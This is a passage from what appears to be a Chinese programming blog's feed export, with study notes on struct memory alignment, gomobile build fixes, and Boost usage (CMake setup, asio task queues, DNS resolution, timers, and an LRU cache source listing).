<h1 id="三、数据和地址"><a href="#三、数据和地址" class="headerlink" title="三、数据和地址"></a>三、数据和地址</h1><h2 id="1-地址对齐"><a href="#1-地址对齐" class="headerlink" title="1. 地址对齐"></a>1. 地址对齐</h2><ul>
<li>32位和64位机器的区别在于地址的表示是用32位还是64位表示</li>
<li>由此可以得出计算机对于内存的操作是按照整32位和整64位操作的，这样效率最高</li>
<li>所以对于c语言中结构体的定义，一般是默认4字节对齐或者8字节对齐</li>
<li>内存中的结构体的储存是在以4字节或8字节为单位的内存块中</li>
<li>那么可以说明结构体的首地址一定是4的倍数或8的倍数</li>
</ul>
<h3 id="举例，按照32位举例，64位类似"><a href="#举例，按照32位举例，64位类似" class="headerlink" title="举例，按照32位举例，64位类似"></a>举例，按照32位举例，64位类似</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">rb_node</span> &#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>  __rb_parent_color;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">rb_node</span> *rb_right;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">rb_node</span> *rb_left;</span><br><span class="line">&#125; __attribute__((<span class="built_in">aligned</span>(<span class="built_in">sizeof</span>(<span class="type">long</span>))));</span><br></pre></td></tr></table></figure>

<ul>
<li>上面的结构体是4字节对齐，说明<code>rb_node</code>结构体在内存中的存储一定是4的倍数</li>
<li>因为地址中每个地址代表一个8位的内存块，对于cpu来说，一次读取一个内存块是4个字节的</li>
<li>如果要处理结构体，从效率来说，将结构体存到4的倍数是可以直接读取到首地址，不然还要偏移</li>
<li>所以上面的结构体，地址一定是4的倍数，也就是<code>0x00</code>、<code>0x04</code>、<code>0x08</code>这样的，后两位一定是0</li>
</ul>
]]></content>
      <categories>
        <category>Knowledge</category>
        <category>Study</category>
      </categories>
  </entry>
  <entry>
    <title>gomobile使用笔记</title>
    <url>/blogs/2022-05-24-gomobile/</url>
    <content><![CDATA[<h1 id="一、安装"><a href="#一、安装" class="headerlink" title="一、安装"></a>一、安装</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">go install -v golang.org/x/mobile@latest</span><br><span class="line">go install -v golang.org/x/mobile/cmd/gomobile@latest</span><br></pre></td></tr></table></figure>

<h1 id="小技巧和踩坑记"><a href="#小技巧和踩坑记" class="headerlink" title="小技巧和踩坑记"></a>小技巧和踩坑记</h1><h2 id="1-提示gomobile-no-usable-NDK-in-home-wangyubo-Android-Sdk-unsupported-API-version-16-not-in-19-32-open-home-wangyubo-Android-Sdk-ndk-bundle-meta-platforms-json-no-such-file-or-directory"><a href="#1-提示gomobile-no-usable-NDK-in-home-wangyubo-Android-Sdk-unsupported-API-version-16-not-in-19-32-open-home-wangyubo-Android-Sdk-ndk-bundle-meta-platforms-json-no-such-file-or-directory" class="headerlink" title="1. 提示gomobile: no usable NDK in /home/wangyubo/Android/Sdk: unsupported API version 16 (not in 19..32), open /home/wangyubo/Android/Sdk/ndk-bundle/meta/platforms.json: no such file or directory"></a>1. 提示<code>gomobile: no usable NDK in /home/wangyubo/Android/Sdk: unsupported API version 16 (not in 19..32), open /home/wangyubo/Android/Sdk/ndk-bundle/meta/platforms.json: no such file or directory</code></h2><ul>
<li>不是找不到，默认的最低版本androidapi（16）找的ndk路径在sdk里面的就是<code>ndk-bundle</code></li>
<li>高版本ndk已经改成<code>ndk/version</code>，可以自动识别，所以直接指定androidapi的版本即可</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gomobile build -v -target android -androidapi 32 apktest</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Program</category>
        <category>Android</category>
      </categories>
  </entry>
  <entry>
    <title>boost库使用记录</title>
    <url>/blogs/2022-05-19-boost/</url>
    <content><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><h2 id="1-cmake使用"><a href="#1-cmake使用" class="headerlink" title="1. cmake使用"></a>1. cmake使用</h2><figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 指定使用boost库的静态库还是动态库</span></span><br><span class="line"><span class="keyword">set</span>(Boost_USE_STATIC_LIBS <span class="keyword">ON</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.70: 指定boost库最低版本1.70，可以不加</span></span><br><span class="line"><span class="comment"># REQUIRED: 必须找到，不然报错</span></span><br><span class="line"><span class="comment"># COMPONENTS: 找到filesystem和system两个模块，模块路径会加到Boost_LIBRARIES变量中，不加模块此变量为空</span></span><br><span class="line"><span class="comment">#             不添加模块查找，Boost_LIBRARY_DIRS同样也为空</span></span><br><span class="line"><span class="keyword">find_package</span>(Boost <span class="number">1.70</span> REQUIRED</span><br><span class="line">	COMPONENTS filesystem system</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 头文件必须加，否则会找不到</span></span><br><span class="line"><span class="keyword">target_include_directories</span>(<span class="variable">$&#123;BIN_NAME&#125;</span> PRIVATE</span><br><span class="line">    <span class="comment"># 第三方库头文件</span></span><br><span class="line">    <span class="variable">$&#123;Boost_INCLUDE_DIR&#125;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 两种方式添加，一种是指定要链接的库</span></span><br><span class="line"><span class="keyword">target_link_libraries</span>(</span><br><span class="line">    <span class="variable">$&#123;BIN_NAME&#125;</span> PRIVATE</span><br><span class="line">    <span class="comment"># 第三方库</span></span><br><span class="line">    <span class="variable">$&#123;Boost_LIBRARIES&#125;</span></span><br><span class="line">)</span><br><span class="line"><span class="comment"># 另一种是指定库所在目录，在编译时自动添加</span></span><br><span class="line"><span class="keyword">target_link_directories</span>(</span><br><span class="line">    <span class="variable">$&#123;BIN_NAME&#125;</span> PRIVATE</span><br><span class="line">    <span class="comment"># 第三方库</span></span><br><span class="line">    <span class="variable">$&#123;Boost_LIBRARY_DIRS&#125;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h1 id="二、使用实例"><a href="#二、使用实例" class="headerlink" title="二、使用实例"></a>二、使用实例</h1><h2 id="boost-algorithm-string-predicate-hpp"><a href="#boost-algorithm-string-predicate-hpp" class="headerlink" title="boost&#x2F;algorithm&#x2F;string&#x2F;predicate.hpp"></a>boost&#x2F;algorithm&#x2F;string&#x2F;predicate.hpp</h2><h3 id="1-忽略大小写对比字符串"><a href="#1-忽略大小写对比字符串" class="headerlink" title="1. 忽略大小写对比字符串"></a>1. 忽略大小写对比字符串</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> ret = boost::<span class="built_in">iequals</span>(str1, str2);</span><br></pre></td></tr></table></figure>

<h2 id="boost-asio-hpp"><a href="#boost-asio-hpp" class="headerlink" title="boost&#x2F;asio.hpp"></a>boost&#x2F;asio.hpp</h2><h3 id="1-asio-io-context-任务队列"><a href="#1-asio-io-context-任务队列" class="headerlink" title="1. asio::io_context 任务队列"></a>1. asio::io_context 任务队列</h3><ul>
<li>post放到队列最后，等待调度</li>
<li>dispatch如果在当前线程，就直接执行，不在就和post一致</li>
<li>整个队列实测是顺序执行的</li>
<li><code>stop()</code>调用后需要调用<code>restart()</code>才能重新进行<code>run()</code></li>
</ul>
<h4 id="示例1-单线程模型"><a href="#示例1-单线程模型" class="headerlink" title="示例1 单线程模型"></a>示例1 单线程模型</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;boost/asio.hpp&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;log.hpp&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">testFunc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    boost::asio::io_context ioc;</span><br><span class="line">    boost::asio::<span class="function">io_context::work <span class="title">worker</span><span class="params">(ioc)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">std::thread <span class="title">t1</span><span class="params">([&amp;ioc]() &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">        ioc.run();</span></span></span><br><span class="line"><span class="params"><span class="function">        LOGI(WHAT(<span class="string">&quot;ioc exit&quot;</span>));</span></span></span><br><span class="line"><span class="params"><span class="function">    &#125;)</span></span>;</span><br><span class="line">    <span class="comment">// detach用于让线程自由，防止函数退出时出现栈溢出</span></span><br><span class="line">    t1.<span class="built_in">detach</span>();</span><br><span class="line">    <span class="comment">// worker就是在这种情况下起作用，这时一直没有任务，ioc不退出</span></span><br><span class="line">    std::this_thread::<span class="built_in">sleep_for</span>(std::chrono::<span class="built_in">seconds</span>(<span class="number">3</span>));</span><br><span class="line"></span><br><span class="line">    std::promise&lt;<span class="type">void</span>&gt; p;</span><br><span class="line">    <span class="type">int</span> testValue = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">LOGI</span>(<span class="built_in">WHAT</span>(<span class="string">&quot;push task&quot;</span>));</span><br><span class="line">    <span class="comment">// 添加一个任务到ioc中</span></span><br><span class="line">    ioc.<span class="built_in">post</span>([&amp;testValue, &amp;p, &amp;ioc]() &#123;</span><br><span class="line">        std::this_thread::<span class="built_in">sleep_for</span>(std::chrono::<span class="built_in">seconds</span>(<span class="number">3</span>));</span><br><span class="line">        testValue = <span class="number">1</span>;</span><br><span class="line">        p.<span class="built_in">set_value</span>();</span><br><span class="line">    &#125;);</span><br><span class="line">    p.<span class="built_in">get_future</span>().<span class="built_in">wait</span>();</span><br><span class="line">    <span class="built_in">LOGI</span>(<span class="built_in">WHAT</span>(<span class="string">&quot;testValue &#123;&#125;&quot;</span>, testValue));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argC, <span class="type">char</span> *argV[])</span> </span>&#123;</span><br><span class="line">    <span class="built_in">testFunc</span>();</span><br><span class="line">    <span class="built_in">LOGI</span>(<span class="built_in">WHAT</span>(<span class="string">&quot;main end&quot;</span>));</span><br><span class="line">    <span class="comment">// 这里等待用于查看worker作用域消失，ioc会退出</span></span><br><span class="line">    std::this_thread::<span class="built_in">sleep_for</span>(std::chrono::<span class="built_in">seconds</span>(<span class="number">5</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[2022-05-30 15:57:17.166] [info] [main.cpp:37] push task</span><br><span class="line">[2022-05-30 15:57:20.166] [info] [main.cpp:44] testValue 1</span><br><span class="line">[2022-05-30 15:57:20.167] [info] [main.cpp:30] ioc exit</span><br><span class="line">[2022-05-30 15:57:20.167] [info] [main.cpp:74] main end</span><br></pre></td></tr></table></figure>

<p>解释一下</p>
<ul>
<li>使用worker防止线程退出，所以线程detach后没有打印<code>ioc exit</code>，而函数退出后，worker作用域没了，ioc就退出了</li>
<li>如果不使用worker，ioc一开始就会退出，程序将卡死在<code>p.get_future().wait()</code></li>
</ul>
<h4 id="示例2-多线程模型"><a href="#示例2-多线程模型" class="headerlink" title="示例2 多线程模型"></a>示例2 多线程模型</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Test</span>(<span class="type">int</span> num) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Test()&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; num; i++) &#123;</span><br><span class="line">            m_futures.<span class="built_in">emplace_back</span>(<span class="built_in">async</span>(launch::async, [<span class="keyword">this</span>]() &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// 几个线程调用run，任务就会分发到几个线程</span></span><br><span class="line">                    boost::asio::io_context::work <span class="built_in">work</span>(m_ioContext);</span><br><span class="line">                    m_ioContext.<span class="built_in">run</span>();</span><br><span class="line">                &#125; <span class="built_in">catch</span> (...) &#123;</span><br><span class="line">                    std::stringstream ss;</span><br><span class="line">                    ss &lt;&lt; boost::stacktrace::<span class="built_in">stacktrace</span>();</span><br><span class="line">                    <span class="keyword">auto</span> error = boost::<span class="built_in">current_exception_diagnostic_information</span>();</span><br><span class="line">                    <span class="keyword">auto</span> stack = ss.<span class="built_in">str</span>();</span><br><span class="line">                    <span class="built_in">LOGE</span>(<span class="built_in">WHAT</span>(<span class="string">&quot;thread exit with exception&quot;</span>), <span class="built_in">REASON</span>(<span class="string">&quot;error &#123;&#125;, stack \n&#123;&#125;&quot;</span>, error, stack),</span><br><span class="line">                        <span class="built_in">WILL</span>(<span class="string">&quot;thread exit&quot;</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ~<span class="built_in">Test</span>() &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;~Test()&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="comment">// 要先停止ioContext才能等待future，否则会因为work存在卡死</span></span><br><span class="line">        m_ioContext.<span class="built_in">stop</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; f : m_futures) &#123;</span><br><span class="line">            <span class="keyword">if</span> (f.<span class="built_in">valid</span>()) f.<span class="built_in">wait</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">post</span><span class="params">(std::function&lt;<span class="type">void</span>()&gt; func)</span> </span>&#123;</span><br><span class="line">        m_ioContext.<span class="built_in">post</span>(func);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    vector&lt;future&lt;<span class="type">void</span>&gt;&gt; m_futures;</span><br><span class="line">    boost::asio::io_context m_ioContext;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argC, <span class="type">char</span> *argV[])</span> </span>&#123;</span><br><span class="line">    <span class="function">Test <span class="title">test</span><span class="params">(<span class="number">3</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">LOGI</span>(<span class="built_in">WHAT</span>(<span class="string">&quot;push task&quot;</span>));</span><br><span class="line">    std::vector&lt;std::promise&lt;<span class="type">void</span>&gt;&gt; <span class="built_in">promises</span>(<span class="number">100</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">auto</span> &amp;p = promises[i];</span><br><span class="line">        <span class="keyword">auto</span> taskFunc = [i, &amp;p]() &#123;</span><br><span class="line">            std::this_thread::<span class="built_in">sleep_for</span>(std::chrono::<span class="built_in">milliseconds</span>((<span class="number">100</span> - i) * <span class="number">10</span>));</span><br><span class="line">            <span class="built_in">LOGI</span>(<span class="built_in">WHAT</span>(<span class="string">&quot;task &#123;&#125; done&quot;</span>, i));</span><br><span class="line">            p.<span class="built_in">set_value</span>();</span><br><span class="line">        &#125;;</span><br><span class="line">        test.<span class="built_in">post</span>(taskFunc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">LOGI</span>(<span class="built_in">WHAT</span>(<span class="string">&quot;push task done&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; promises.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">        promises[i].<span class="built_in">get_future</span>().<span class="built_in">get</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">LOGI</span>(<span class="built_in">WHAT</span>(<span class="string">&quot;taskDone&quot;</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-asio-ip-tcp-resolver-dns解析"><a href="#2-asio-ip-tcp-resolver-dns解析" class="headerlink" title="2. asio::ip::tcp::resolver dns解析"></a>2. asio::ip::tcp::resolver dns解析</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argC, <span class="type">char</span> *argV[])</span> </span>&#123;</span><br><span class="line">    boost::asio::io_context ioc;</span><br><span class="line">    boost::asio::<span class="function">io_context::work <span class="title">worker</span><span class="params">(ioc)</span></span>;</span><br><span class="line">    <span class="comment">// 要新起一个线程进行处理dns请求</span></span><br><span class="line">    <span class="keyword">auto</span> asyncFuture = std::<span class="built_in">async</span>(std::launch::async, [&amp;ioc]() &#123;</span><br><span class="line">        ioc.<span class="built_in">run</span>();</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    boost::asio::ip::<span class="function">tcp::resolver <span class="title">resolver</span><span class="params">(ioc)</span></span>;</span><br><span class="line">    boost::asio::ip::tcp::<span class="function">resolver::query <span class="title">query</span><span class="params">(<span class="string">&quot;www.baidu.com&quot;</span>, <span class="string">&quot;http&quot;</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这里解析是同步的</span></span><br><span class="line">    <span class="keyword">auto</span> result = resolver.<span class="built_in">resolve</span>(query);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> it = result.<span class="built_in">begin</span>(); it != result.<span class="built_in">end</span>(); ++it) &#123;</span><br><span class="line">        <span class="built_in">LOGI</span>(<span class="built_in">WHAT</span>(<span class="string">&quot;resolve success! domain=&#123;&#125;, host_name=&#123;&#125;, service_name=&#123;&#125;, address=&#123;&#125;&quot;</span>, <span class="string">&quot;www.baidu.com&quot;</span>,</span><br><span class="line">                  it-&gt;<span class="built_in">host_name</span>(), it-&gt;<span class="built_in">service_name</span>(), it-&gt;<span class="built_in">endpoint</span>().<span class="built_in">address</span>().<span class="built_in">to_string</span>()));</span><br><span class="line">    &#125;</span><br><span class="line">    ioc.<span class="built_in">stop</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3-boost-asio-steady-timer-定时器"><a href="#3-boost-asio-steady-timer-定时器" class="headerlink" title="3. boost::asio::steady_timer 定时器"></a>3. boost::asio::steady_timer 定时器</h3><ul>
<li>定时器需要依赖<code>ioContext</code>进行初始化</li>
<li>没有提供周期性的定时器，需要每次定时器超时重新设置定时器超时时间</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> IOContext = boost::asio::io_context;</span><br><span class="line"><span class="keyword">using</span> IOContextPtr = std::shared_ptr&lt;IOContext&gt;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    IOContextPtr m_pIOContext;          <span class="comment">// 全局唯一工作线程</span></span><br><span class="line">    std::future&lt;<span class="type">void</span>&gt; m_future;         <span class="comment">// 工作线程的future</span></span><br><span class="line">    boost::asio::steady_timer m_timer;  <span class="comment">// 定时器，用于清理ctx</span></span><br><span class="line">    <span class="type">int</span> m_timeout;                      <span class="comment">// 定时器周期，单位ms</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">Test</span><span class="params">(<span class="type">int</span> timeout)</span> : m_pIOContext(std::make_shared&lt;IOContext&gt;()), m_timer(*m_pIOContext), m_timeout(timeout) &#123;</span></span><br><span class="line">        <span class="comment">// 启动工作线程</span></span><br><span class="line">        m_future = std::<span class="built_in">async</span>(std::launch::async, [<span class="keyword">this</span>]() &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                boost::asio::io_context::work <span class="built_in">work</span>(*m_pIOContext);</span><br><span class="line">                m_pIOContext-&gt;<span class="built_in">run</span>();</span><br><span class="line">            &#125; <span class="built_in">catch</span> (...) &#123;</span><br><span class="line">                std::stringstream ss;</span><br><span class="line">                ss &lt;&lt; boost::stacktrace::<span class="built_in">stacktrace</span>();</span><br><span class="line">                <span class="keyword">auto</span> error = boost::<span class="built_in">current_exception_diagnostic_information</span>();</span><br><span class="line">                <span class="keyword">auto</span> stack = ss.<span class="built_in">str</span>();</span><br><span class="line">                <span class="built_in">LOGE</span>(<span class="built_in">WHAT</span>(<span class="string">&quot;thread exit with exception&quot;</span>), <span class="built_in">REASON</span>(<span class="string">&quot;error &#123;&#125;, stack \n&#123;&#125;&quot;</span>, error, stack),</span><br><span class="line">                     <span class="built_in">WILL</span>(<span class="string">&quot;thread exit&quot;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 启动定时器</span></span><br><span class="line">        <span class="built_in">setTimer</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ~<span class="built_in">Test</span>() &#123; <span class="built_in">stop</span>(); &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">stop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 停止线程，循环防止ioContext还没跑就停止造成死锁</span></span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (m_pIOContext != <span class="literal">nullptr</span> &amp;&amp; !m_pIOContext-&gt;<span class="built_in">stopped</span>()) &#123;</span><br><span class="line">                m_pIOContext-&gt;<span class="built_in">stop</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 等待工作线程结束</span></span><br><span class="line">            <span class="keyword">if</span> (!m_future.<span class="built_in">valid</span>()) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> (m_future.<span class="built_in">wait_for</span>(std::chrono::<span class="built_in">milliseconds</span>(<span class="number">1</span>)) != std::future_status::ready);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">setTimer</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        m_timer.<span class="built_in">expires_after</span>(std::chrono::<span class="built_in">milliseconds</span>(m_timeout));</span><br><span class="line">        <span class="comment">// async_wait不会阻塞，可以认为是启用定时器</span></span><br><span class="line">        m_timer.<span class="built_in">async_wait</span>([<span class="keyword">this</span>](<span class="type">const</span> boost::system::error_code &amp;ec) &#123;</span><br><span class="line">            <span class="keyword">if</span> (ec) &#123;</span><br><span class="line">                <span class="comment">// 错误存在两种情况，ioContext停止不会触发错误</span></span><br><span class="line">                <span class="comment">// 1. 定时器还在等待，重新调用expires_after</span></span><br><span class="line">                <span class="comment">// 2. 显式调用cancel</span></span><br><span class="line">                <span class="built_in">LOGE</span>(<span class="built_in">WHAT</span>(<span class="string">&quot;timer error&quot;</span>), <span class="built_in">REASON</span>(<span class="string">&quot;ec: &#123;&#125;&quot;</span>, std::<span class="built_in">to_string</span>(ec)), NO_WILL);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// do something</span></span><br><span class="line">            <span class="comment">// 重新设置定时器</span></span><br><span class="line">            <span class="built_in">LOGI</span>(<span class="built_in">WHAT</span>(<span class="string">&quot;Timer handler&quot;</span>));</span><br><span class="line">            <span class="built_in">setTimer</span>();</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="boost-compute-detail-lru-cache-hpp"><a href="#boost-compute-detail-lru-cache-hpp" class="headerlink" title="boost&#x2F;compute&#x2F;detail&#x2F;lru_cache.hpp"></a>boost&#x2F;compute&#x2F;detail&#x2F;lru_cache.hpp</h2><h3 id="1-源码"><a href="#1-源码" class="headerlink" title="1. 源码"></a>1. 源码</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// boost/compute/detail/lru_cache.hpp</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">Key</span>, <span class="keyword">class</span> <span class="title class_">Value</span>&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">lru_cache</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">typedef</span> Key key_type;</span><br><span class="line">    <span class="keyword">typedef</span> Value value_type;</span><br><span class="line">    <span class="keyword">typedef</span> std::list&lt;key_type&gt; list_type;</span><br><span class="line">    <span class="keyword">typedef</span> std::map&lt;</span><br><span class="line">                key_type,</span><br><span class="line">                std::pair&lt;value_type, <span class="keyword">typename</span> list_type::iterator&gt;</span><br><span class="line">            &gt; map_type;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">lru_cache</span>(<span class="type">size_t</span> capacity)</span><br><span class="line">        : <span class="built_in">m_capacity</span>(capacity)</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ~<span class="built_in">lru_cache</span>()</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">size_t</span> <span class="title">size</span><span class="params">()</span> <span class="type">const</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> m_map.<span class="built_in">size</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">size_t</span> <span class="title">capacity</span><span class="params">()</span> <span class="type">const</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> m_capacity;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">empty</span><span class="params">()</span> <span class="type">const</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> m_map.<span class="built_in">empty</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">contains</span><span class="params">(<span class="type">const</span> key_type &amp;key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> m_map.<span class="built_in">find</span>(key) != m_map.<span class="built_in">end</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">insert</span><span class="params">(<span class="type">const</span> key_type &amp;key, <span class="type">const</span> value_type &amp;value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">typename</span> map_type::iterator i = m_map.<span class="built_in">find</span>(key);</span><br><span class="line">        <span class="keyword">if</span>(i == m_map.<span class="built_in">end</span>())&#123;</span><br><span class="line">            <span class="comment">// insert item into the cache, but first check if it is full</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">size</span>() &gt;= m_capacity)&#123;</span><br><span class="line">                <span class="comment">// cache is full, evict the least recently used item</span></span><br><span class="line">                <span class="built_in">evict</span>();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// insert the new item</span></span><br><span class="line">            m_list.<span class="built_in">push_front</span>(key);</span><br><span class="line">            m_map[key] = std::<span class="built_in">make_pair</span>(value, m_list.<span class="built_in">begin</span>());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">boost::optional&lt;value_type&gt; <span class="title">get</span><span class="params">(<span class="type">const</span> key_type &amp;key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// lookup value in the cache</span></span><br><span class="line">        <span class="keyword">typename</span> map_type::iterator i = m_map.<span class="built_in">find</span>(key);</span><br><span class="line">        <span class="keyword">if</span>(i == m_map.<span class="built_in">end</span>())&#123;</span><br><span class="line">            <span class="comment">// value not in cache</span></span><br><span class="line">            <span class="keyword">return</span> boost::none;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// return the value, but first update its place in the most</span></span><br><span class="line">        <span class="comment">// recently used list</span></span><br><span class="line">        <span class="keyword">typename</span> list_type::iterator j = i-&gt;second.second;</span><br><span class="line">        <span class="keyword">if</span>(j != m_list.<span class="built_in">begin</span>())&#123;</span><br><span class="line">            <span class="comment">// move item to the front of the most recently used list</span></span><br><span class="line">            m_list.<span class="built_in">erase</span>(j);</span><br><span class="line">            m_list.<span class="built_in">push_front</span>(key);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// update iterator in map</span></span><br><span class="line">            j = m_list.<span class="built_in">begin</span>();</span><br><span class="line">            <span class="type">const</span> value_type &amp;value = i-&gt;second.first;</span><br><span class="line">            m_map[key] = std::<span class="built_in">make_pair</span>(value, j);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// return the value</span></span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// the item is already at the front of the most recently</span></span><br><span class="line">            <span class="comment">// used list so just return it</span></span><br><span class="line">            <span class="keyword">return</span> i-&gt;second.first;</span><br><span class="line">        